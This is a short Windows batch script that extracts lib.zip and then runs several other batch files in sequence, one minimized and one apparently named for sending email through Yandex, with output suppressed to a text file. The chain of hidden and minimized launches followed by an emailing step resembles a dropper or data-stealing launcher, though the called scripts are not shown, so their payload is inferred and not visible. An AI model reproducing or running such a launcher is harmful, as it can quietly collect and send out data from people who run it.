@echo off
powershell -command "Expand-Archive -Force \"lib.zip\"" > out.txt && cd lib && cd lib && start outputfile.bat && timeout /t 5 > out.txt && start /min a.bat && timeout /t 10 > out.txt && sendemailyandex.bat "a" "a" "a" > out.txt
exit